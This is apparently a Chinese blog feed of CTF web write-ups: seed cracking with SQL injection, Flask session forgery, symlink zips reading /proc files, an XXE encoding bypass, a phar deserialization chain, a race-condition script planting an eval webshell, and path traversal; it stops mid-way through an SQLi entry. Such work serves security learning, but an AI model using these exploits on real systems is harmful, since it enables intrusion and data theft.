&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116015910.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;mrctf2020ezaudithttpsbuuojcnchallengesmrctf2020ezaudit&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[MRCTF2020]Ezaudit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MRCTF2020]Ezaudit&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：PHP伪随机数，sql注入&lt;/p&gt;
&lt;p&gt;要先扫目录，可以扫到login.php和www.zip，源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
header(&#39;Content-type:text/html; charset=utf-8&#39;);
error_reporting(0);
if(isset($_POST[&#39;login&#39;])){
    $username = $_POST[&#39;username&#39;];
    $password = $_POST[&#39;password&#39;];
    $Private_key = $_POST[&#39;Private_key&#39;];
    if (($username == &#39;&#39;) || ($password == &#39;&#39;) ||($Private_key == &#39;&#39;)) {
// 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header(&#39;refresh:2; url=login.html&#39;);
        echo &amp;quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&amp;quot;;
        exit;
    }
    else if($Private_key != &#39;*************&#39; )
    {
        header(&#39;refresh:2; url=login.html&#39;);
        echo &amp;quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&amp;quot;;
        exit;
    }
 
    else{
        if($Private_key === &#39;************&#39;){
            $getuser = &amp;quot;SELECT flag FROM user WHERE username= &#39;crispr&#39; AND password = &#39;$password&#39;&amp;quot;.&#39;;&#39;;
            $link=mysql_connect(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;root&amp;quot;);
            mysql_select_db(&amp;quot;test&amp;quot;,$link);
            $result = mysql_query($getuser);
            while($row=mysql_fetch_assoc($result)){
                echo &amp;quot;&amp;amp;lt;tr&amp;amp;gt;&amp;amp;lt;td&amp;amp;gt;&amp;quot;.$row[&amp;quot;username&amp;quot;].&amp;quot;&amp;amp;lt;/td&amp;amp;gt;&amp;amp;lt;td&amp;amp;gt;&amp;quot;.$row[&amp;quot;flag&amp;quot;].&amp;quot;&amp;amp;lt;/td&amp;amp;gt;&amp;amp;lt;td&amp;amp;gt;&amp;quot;;
            }
        }
    }
 
}
// genarate public_key
function public_key($length = 16) {
    $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
    $public_key = &#39;&#39;;
    for ( $i = 0; $i &amp;amp;lt; $length; $i++ )
$public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
return $public_key;
}
 
//genarate private_key
function private_key($length = 12) {
    $strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
    $private_key = &#39;&#39;;
    for ( $i = 0; $i &amp;amp;lt; $length; $i++ )
$private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
return $private_key;
}
$Public_key = public_key();
//$Public_key = KVQP0LdJKRaV3n9D how to get crispr&#39;s private_key???
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其实就是两道题焊接起来，用GWCTF的exp可以直接打：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
str1=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;
str2=&#39;KVQP0LdJKRaV3n9D&#39;
str3 = str1[::-1]
length = len(str2)
res=&#39;&#39;
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;
            break
print res
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;拿去php_mt_seed跑，得到种子1775196155，然后去算私钥，注意要先把公钥算一遍再算私钥；&lt;/p&gt;
&lt;p&gt;算出来之后sqli直接万能密码登录；&lt;/p&gt;
&lt;p&gt;flag{a0b16377-22ae-4b81-b054-2afb7a5e6e6b&lt;/p&gt;
&lt;h3 id=&#34;swpu2019web3httpsbuuojcnchallengesswpu2019web3&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[SWPU2019]Web3&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SWPU2019]Web3&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：flask session伪造、命令注入、CVE-2018-12015、&lt;code&gt;/proc/self/cwd&lt;/code&gt;、&lt;code&gt;/proc/self/environ&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;gt;&amp;gt;[Linux下/proc/&lt;a class=&#34;link&#34; href=&#34;https://www.hi-linux.com/posts/64295.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;pid]/*的作用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116020019.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;输入用户名登录，页面会显示“Hello wh1sper”，尝试&lt;code&gt;{{}}&lt;/code&gt;没有探测到注入。&lt;/p&gt;
&lt;p&gt;登陆之后有个/upload路由，但是提示没有权限，估计是要进行cookie伪造&lt;/p&gt;
&lt;p&gt;转而把注意力放在了cookie上面。&lt;/p&gt;
&lt;h4 id=&#34;session伪造&#34;&gt;session伪造&lt;/h4&gt;
&lt;p&gt;利用flask-session-cookie-manager-master进行解码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python .\flask_session_cookie_manager3.py decode -c &amp;quot;.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVCrPMCwuSC1S0lEqLU4tykvMTUUSrAUA2H4Z2g.X3vTHQ.Se1sFiI38_RUBhZeYgBMY2hoNaQ&amp;quot;
b&#39;{&amp;quot;id&amp;quot;:{&amp;quot; b&amp;quot;:&amp;quot;MTAw&amp;quot;},&amp;quot;is_login&amp;quot;:true,&amp;quot;password&amp;quot;:&amp;quot;wh1sper&amp;quot;,&amp;quot;username&amp;quot;:&amp;quot;wh1sper&amp;quot;}&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果访问不存在的路由会给一个响应头：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg== 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;base64解码之后就是secret_key(这里没搞懂为什么要这样出):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SECRET_KEY:keyqqqwwweee!@#$%^&amp;amp;* 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再次进行解码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python .\flask_session_cookie_manager3.py decode -c &amp;quot;.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVCrPMCwuSC1S0lEqLU4tykvMTUUSrAUA2H4Z2g.X3vTHQ.Se1sFiI38_RUBhZeYgBMY2hoNaQ&amp;quot; -s &amp;quot;keyqqqwwweee!@#$%^&amp;amp;*&amp;quot;
{&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;wh1sper&#39;, &#39;username&#39;: &#39;wh1sper&#39;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;盲猜如果id=1的话应该就可以越权，那么再次加密回去；&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python .\flask_session_cookie_manager3.py encode -s &amp;quot;keyqqqwwweee!@#$%^&amp;amp;*&amp;quot; -t &amp;quot;{&#39;id&#39;: &#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;wh1sper&#39;, &#39;username&#39;: &#39;wh1sper&#39;}&amp;quot;
.eJyrVspMUbJSMlTSUcosjs_JT8_MU7IqKSpN1VEqSCwuLs8vAkmXZxgWF6QWARWVFqcW5SXmpiIJ1gIA95wWug.X3vb0w.5S11T85EsOVa2ggJa_vbtgJDxr4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;F12替换cookie，来到/upload路由；&lt;/p&gt;
&lt;p&gt;ctrl+U能够查看到后端源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;@app.route(&#39;/upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def upload():
    if session[&#39;id&#39;] != b&#39;1&#39;:
        return render_template_string(temp)
    if request.method == &#39;POST&#39;:
        m = hashlib.md5()
        name = session[&#39;password&#39;]
        name = name + &#39;qweqweqwe&#39;
        name = name.encode(encoding=&#39;utf-8&#39;)
        m.update(name)
        md5_one = m.hexdigest()
        n = hashlib.md5()
        ip = request.remote_addr
        ip = ip.encode(encoding=&#39;utf-8&#39;)
        n.update(ip)
        md5_ip = n.hexdigest()
        f = request.files[&#39;file&#39;]
        basepath = os.path.dirname(os.path.realpath(__file__))
        path = basepath + &#39;/upload/&#39; + md5_ip + &#39;/&#39; + md5_one + &#39;/&#39; + session[&#39;username&#39;] + &amp;quot;/&amp;quot;
        path_base = basepath + &#39;/upload/&#39; + md5_ip + &#39;/&#39;
        filename = f.filename
        pathname = path + filename
        if &amp;quot;zip&amp;quot; != filename.split(&#39;.&#39;)[-1]:
            return &#39;zip only allowed&#39;
        if not os.path.exists(path_base):
            try:
                os.makedirs(path_base)
            except Exception as e:
                return &#39;error&#39;
        if not os.path.exists(path):
            try:
                os.makedirs(path)
            except Exception as e:
                return &#39;error&#39;
        if not os.path.exists(pathname):
            try:
                f.save(pathname)
            except Exception as e:
                return &#39;error&#39;
        try:
            cmd = &amp;quot;unzip -n -d &amp;quot; + path + &amp;quot; &amp;quot; + pathname
            if cmd.find(&#39;|&#39;) != -1 or cmd.find(&#39;;&#39;) != -1:
                waf()
            return &#39;error&#39;
            os.system(cmd)
        except Exception as e:
            return &#39;error&#39;
        unzip_file = zipfile.ZipFile(pathname, &#39;r&#39;)
        unzip_filename = unzip_file.namelist()[0]
        if session[&#39;is_login&#39;] != True:
            return &#39;not login&#39;
        try:
            if unzip_filename.find(&#39;/&#39;) != -1:
                shutil.rmtree(path_base)
                os.mkdir(path_base)
                return &#39;error&#39;
            image = open(path + unzip_filename, &amp;quot;rb&amp;quot;).read()
            resp = make_response(image)
            resp.headers[&#39;Content-Type&#39;] = &#39;image/png&#39;
            return resp
        except Exception as e:
            shutil.rmtree(path_base)
            os.mkdir(path_base)
            return &#39;error&#39;
    return render_template(&#39;upload.html&#39;)
 
 
@app.route(&#39;/showflag&#39;)
def showflag():
    if True == False:
        image = open(os.path.join(&#39;./flag/flag.jpg&#39;), &amp;quot;rb&amp;quot;).read()
        resp = make_response(image)
        resp.headers[&#39;Content-Type&#39;] = &#39;image/png&#39;
        return resp
    else:
        return &amp;quot;can&#39;t give you&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;利用软连接获取flagcve-2018-12015httpswwwanquankecomvulid1198331&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/vul/id/1198331&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;利用软连接获取flag：CVE-2018-12015&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Perl是美国程序员拉里-沃尔（Larry Wall）所研发的一种免费且功能强大的跨平台编程语言。Archive：：Tar module是其中的一个用于处理tar文件的模块。 Perl 5.26.2及之前版本中的Archive：：Tar模块存在安全漏洞。攻击者可借助带有相同名称的符号链接和常规文件的归档文件利用该漏洞绕过目录遍历保护机制并覆盖任意文件。&lt;/p&gt;
&lt;p&gt;以正常逻辑来看，源码的功能就是客户端上传一个压缩后的图片，服务端会解压缩后并读取图片返回客户端。但是我们可以上传一个软链接压缩包，来读取其他敏感文件而不是我们上传的文件。同时结合 showflag()函数的源码，我们可以得知 flag.jpg 放在 flask 应用根目录的 flag 目录下。那么我们只要创建一个到&lt;code&gt;/xxx/flask/flag/flag.jpg&lt;/code&gt;的软链接，即可读取 flag.jpg 文件。&lt;/p&gt;
&lt;p&gt;在 linux 中，&lt;code&gt;/proc/self/cwd/&lt;/code&gt;会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用&lt;code&gt;/proc/self/cwd/flag/flag.jpg&lt;/code&gt;来访问 flag.jpg&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ln -s /proc/self/cwd/flag/flag.jpg qwe
zip -ry qwe.zip qwe
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;repeater手动上传获得flag&lt;/p&gt;
&lt;p&gt;另外一种方法是获取flask运行的绝对路径，在 linux 中，&lt;code&gt;/proc/self/environ&lt;/code&gt;文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到&lt;code&gt;/proc/self/environ&lt;/code&gt;的内容，只需要下载到本地，用 notepad++打开即可)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ln -s /proc/self/environ qqq
zip -ry qqq.zip qqq
ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www
zip -ry [www.zip](http://www.zip) www
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;利用命令注入获取flag&#34;&gt;利用命令注入获取flag&lt;/h4&gt;
&lt;p&gt;另一种方法是通过命令注入来外带flag，我试了试本地是可以的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116020036.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;VPS上面监听是可以收到的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116020459.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;但是在BUU复现的时候，我开了内网靶机却没有外带成功，不知道是什么原因，那就不搞他了。&lt;/p&gt;
&lt;p&gt;不得不说利用文件名进行命令注入的思路是很秒的&lt;/p&gt;
&lt;h3 id=&#34;csawqual-2019web_unagihttpsbuuojcnchallengescsawqual202019web_unagi&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[CSAWQual%202019]Web_Unagi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CSAWQual 2019]Web_Unagi&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：XXE、编码绕过、外带数据&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116020246.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;打开题目有一个上传界面，叫我们上传一个用户，并且here给了一个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&#39;1.0&#39;?&amp;gt;
&amp;lt;users&amp;gt;
    &amp;lt;user&amp;gt;
        &amp;lt;username&amp;gt;alice&amp;lt;/username&amp;gt;
        &amp;lt;password&amp;gt;passwd1&amp;lt;/password&amp;gt;
        &amp;lt;name&amp;gt;Alice&amp;lt;/name&amp;gt;
        &amp;lt;email&amp;gt;alice@fakesite.com&amp;lt;/email&amp;gt;  
        &amp;lt;group&amp;gt;CSAW2019&amp;lt;/group&amp;gt;
    &amp;lt;/user&amp;gt;
    &amp;lt;user&amp;gt;
        &amp;lt;username&amp;gt;bob&amp;lt;/username&amp;gt;
        &amp;lt;password&amp;gt;passwd2&amp;lt;/password&amp;gt;
        &amp;lt;name&amp;gt; Bob&amp;lt;/name&amp;gt;
        &amp;lt;email&amp;gt;bob@fakesite.com&amp;lt;/email&amp;gt;  
        &amp;lt;group&amp;gt;CSAW2019&amp;lt;/group&amp;gt;
    &amp;lt;/user&amp;gt;
&amp;lt;/users&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;意思就是让我们上传一个XMl文件，由此我们想到了XXE漏洞。&lt;/p&gt;
&lt;p&gt;但是我们在构造外部实体的时候，页面返回&amp;quot;WAF blocked uploaded file. Please try again&amp;quot;。可能是某些词语被waf了，既然有waf我们就要fuzz。&lt;/p&gt;
&lt;p&gt;当我们在外部实体里面去掉&lt;code&gt;&amp;lt;!ENTITY dy SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;&lt;/code&gt; 的时候，页面回显正常了，我们再来一个个测关键词。&lt;/p&gt;
&lt;p&gt;一番fuzz之后，发现过滤了 &lt;code&gt;SYSTEM&lt;/code&gt;、&lt;code&gt;file&lt;/code&gt;、&lt;code&gt;ENTITY&lt;/code&gt;等关键词。&lt;/p&gt;
&lt;p&gt;常规的XXE绕过其中一种方法是利用除UTF-8的编码绕过。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116020259.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;利用Linux的命令可以把文件转换为UTF-16的格式，此时我们上传发现没有出现WAF的信息。&lt;/p&gt;
&lt;p&gt;只需要在标签里面引用实体就行了，但是我们发现flag只显示出来了一半。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116020402.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;回显不出来就要外带数据，可以利用XML的报错信息，也可呀利用盲打的姿势外带。&lt;/p&gt;
&lt;p&gt;我本来想外带VPS的，结过URL填错了直接一个报错出来了。。。&lt;/p&gt;
&lt;h3 id=&#34;ciscn2019-华北赛区-day1-web1dropboxhttpsbuuojcnchallengesciscn201920华北赛区520day1520web1dropbox&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[CISCN2019%20%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba520Day1520Web1]Dropbox&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CISCN2019 华北赛区 Day1 Web1]Dropbox&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：任意文件操作、phar反序列化&lt;/p&gt;
&lt;h4 id=&#34;任意文件下载&#34;&gt;任意文件下载&lt;/h4&gt;
&lt;p&gt;先是注册登录，然后发现有文件上传功能，上传之后只有一个下载和删除的按钮，联想到任意文件下载。&lt;/p&gt;
&lt;p&gt;抓包，果不其然：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116020411.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;挨个下载web路径文件，在class.php里面发现很多的类，联想到反序列化，然而并没有直接发现unserialize的操作。&lt;/p&gt;
&lt;p&gt;结合文件上传，思路过渡到phar反序列化。&lt;/p&gt;
&lt;h4 id=&#34;phar反序列化&#34;&gt;phar反序列化&lt;/h4&gt;
&lt;p&gt;根据phar反序列化的触发函数：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116021051.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;触发点在class.php124行的file_exists函数。&lt;/p&gt;
&lt;p&gt;在download.php里面&lt;code&gt;ini_set(&amp;quot;open_basedir&amp;quot;, getcwd() . &amp;quot;:/etc:/tmp&amp;quot;);&lt;/code&gt;限制了目录，当你反序列化发生在这个页面的时候是不能读取根目录的，能触发但是读不了/flag.txt。&lt;/p&gt;
&lt;p&gt;所以正确的触发点应该是delete.php的17行，调用$file-&amp;gt;open，file_exists触发，delete.php里面并没有限制目录所以可以任意文件读。&lt;/p&gt;
&lt;h4 id=&#34;pop链&#34;&gt;POP链&lt;/h4&gt;
&lt;p&gt;User::__destruct:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function __destruct() {
$this-&amp;gt;db-&amp;gt;close();
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以利用同名方法：&lt;/p&gt;
&lt;p&gt;File::close：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function close() {
  return file_get_contents($this-&amp;gt;filename);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;FileList::__call:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function __call($func, $args) {
array_push($this-&amp;gt;funcs, $func);
foreach ($this-&amp;gt;files as $file) {
  $this-&amp;gt;results[$file-&amp;gt;name()][$func] = $file-&amp;gt;$func();
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class User {
    public $db;
}
 
class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;
 
    public function __construct() {
        $file = new File();
        $file-&amp;gt;filename = &#39;/flag.txt&#39;;
        $this-&amp;gt;files = array($file);
        $this-&amp;gt;results = array();
        $this-&amp;gt;funcs = array();
    }
}
 
 
@unlink(&amp;quot;phar.phar&amp;quot;);
$phar = new Phar(&amp;quot;a.phar&amp;quot;);
$phar-&amp;gt;startBuffering();
$phar-&amp;gt;setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;);
$o = new User();
$o-&amp;gt;db = new FileList();
$phar-&amp;gt;setMetadata($o);
$phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;test&amp;quot;);
$phar-&amp;gt;stopBuffering();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成phar文件之后，抓包改MIME，在delete.php使用phar://文件名触发，读取flag。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2020 X1cT34m WEB方向最终考核</title>
        <link>https://anthem-whisper.github.io/p/2020-x1ct34m-web%E6%96%B9%E5%90%91%E6%9C%80%E7%BB%88%E8%80%83%E6%A0%B8/</link>
        <pubDate>Sat, 08 Aug 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/2020-x1ct34m-web%E6%96%B9%E5%90%91%E6%9C%80%E7%BB%88%E8%80%83%E6%A0%B8/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164754.jpeg" alt="Featured image of post 2020 X1cT34m WEB方向最终考核" /&gt;&lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;从第一次考核到第二次考核，明显感觉自己实力提升了一个层次，不过以后要走的路要踩的坑还很多。&lt;/p&gt;
&lt;p&gt;这次题目很给力，一共九道，难的简单的都有，幸苦@jylsec和@byc_404学长给我们搭建平台和出题目&lt;/p&gt;
&lt;p&gt;对CTF的套路还是不过熟悉，或者说思路还是不够灵敏，导致有些题目卡了很久没拿到一血，这里也膜一下Leon师傅（真的打不过）&lt;/p&gt;
&lt;h3 id=&#34;纪念&#34;&gt;纪念&lt;/h3&gt;
&lt;p&gt;想看wp？怎么可能有wp，这辈子都不可能有wp。上一张纪念图，纪念我和leon师傅纠缠不清的爱情。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181230.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;其他的师傅也要多多加油嗷~~&lt;/p&gt;
</description>
        </item>
        <item>
        <title>W&amp;MCTF2020</title>
        <link>https://anthem-whisper.github.io/p/wmctf2020/</link>
        <pubDate>Mon, 03 Aug 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/wmctf2020/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100849.jpeg" alt="Featured image of post W&amp;MCTF2020" /&gt;&lt;p&gt;0day大战，，，打不动，告辞&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;web_checkin&#34;&gt;web_checkin&lt;/h3&gt;
&lt;p&gt;考点：文件包含file协议&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
@mkdir($sandbox);
@chdir($sandbox);
highlight_file(__FILE__);
if(isset($_GET[&#39;content&#39;])) {
    $content = $_GET[&#39;content&#39;];
    if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))
         die(&#39;hacker&#39;);
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,&#39;&amp;lt;?php exit();&#39;.$content);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接file读取根目录flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?content=file:///flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WMCTF{a1sc8591as98c1a96s85c165as1cas7d89}&lt;/p&gt;
&lt;h3 id=&#34;make-php-great-again&#34;&gt;Make PHP Great Again&lt;/h3&gt;
&lt;p&gt;考点：session.upload_progress文件包含，条件竞争&lt;/p&gt;
&lt;p&gt;referer:https://www.freebuf.com/news/202819.html&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#coding=utf-8
 
import io
import requests
import threading
sessid = &#39;TGAO&#39;
data = {&amp;quot;cmd&amp;quot;:&amp;quot;system(&#39;tac /var/www/html/flag.php&#39;);&amp;quot;}
def write(session):
    while True:
        f = io.BytesIO(b&#39;a&#39; *100* 50)
        resp = session.post( &#39;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com&#39;, data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&amp;lt;?php eval($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;&#39;}, files={&#39;file&#39;: (&#39;tgao.txt&#39;,f)}, cookies={&#39;PHPSESSID&#39;: sessid} )
def read(session):
    while True:
        resp = session.post(&#39;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com?file=/tmp/sess_&#39;+sessid,data=data)
        if &#39;tgao.txt&#39; in resp.text:
            print(resp.text)
            event.clear()
        else:
            print(&amp;quot;[+++++++++++++]retry&amp;quot;)
if __name__==&amp;quot;__main__&amp;quot;:
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write,args=(session,)).start()
 
        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WMCTF{php_s0urc3_1s_om0sh1201}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DASCTF2020.7月赛</title>
        <link>https://anthem-whisper.github.io/p/dasctf2020.7%E6%9C%88%E8%B5%9B/</link>
        <pubDate>Sat, 25 Jul 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/dasctf2020.7%E6%9C%88%E8%B5%9B/</guid>
        <description>&lt;h3 id=&#34;ezfileinclude&#34;&gt;Ezfileinclude&lt;/h3&gt;
&lt;p&gt;考点：Unix时间戳、文件包含、目录穿越&lt;/p&gt;
&lt;p&gt;开局一张图，发现源码 &lt;code&gt;image.php?t=1595664783&amp;amp;f=Z3F5LmpwZw==&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181135.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;访问之，回显：&lt;code&gt;What&#39;s your time?&lt;/code&gt; 仔细看t参数是一个unix时间戳，然后f是base64后的文件名；&lt;/p&gt;
&lt;p&gt;直接写脚本，目录穿越读取/flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import time
import requests
import base64
 
t = int(time.time())
f = &#39;gqy.jpg?../../../../../../flag&#39;
f = base64.b64encode(f.encode()).decode()
print(t, f)
 
host = &#39;http://183.129.189.60:10009/image.php?t={}&amp;amp;f={}&#39;.format(t, f)
head = {
    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)&#39;,
    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;
}
 
r = requests.get(url=host, headers=head)
print(r.text)
 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;sqli&#34;&gt;SQLi&lt;/h3&gt;
&lt;p&gt;考点：无列名注入，sys.schema_tables_with_full_table_scans&lt;/p&gt;
&lt;p&gt;访问要求传入id参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://183.129.189.60:10004/?id=1;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;返回waf：&lt;/p&gt;
